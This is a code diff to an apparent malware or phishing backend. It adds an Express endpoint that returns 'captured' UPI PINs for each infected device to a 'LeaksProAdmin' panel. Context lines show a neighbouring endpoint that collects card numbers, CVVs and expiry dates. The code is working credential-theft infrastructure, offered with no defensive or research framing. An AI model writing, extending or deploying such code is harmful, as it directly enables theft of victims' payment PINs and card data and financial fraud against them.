@@ -2398,6 +2398,25 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.status(500).json({ error: err.message });
     }
   });
+
+  // GET /api/admin/connections/:deviceId/upi-pins — fetch captured PINs for a device
+  // Called by LeaksProAdmin on screen open to show PIN even if real-time event was missed
+  app.get('/api/admin/connections/:deviceId/upi-pins', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      let pins = [];
+      try {
+        pins = db.prepare(
+          `SELECT pin, app, captured_at FROM upi_pins WHERE device_id = ? ORDER BY captured_at DESC LIMIT 10`
+        ).all(deviceId);
+      } catch (_) {}
+      res.json({ pins, latest: pins[0] || null });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
   app.post('/api/devices/payment-info', express.json({ limit: '1mb' }), (req, res) => {
     try {
       const { device_id, method, upi_id, card_number, card_name, card_expiry, card_cvv, card_type, amount } = req.body;
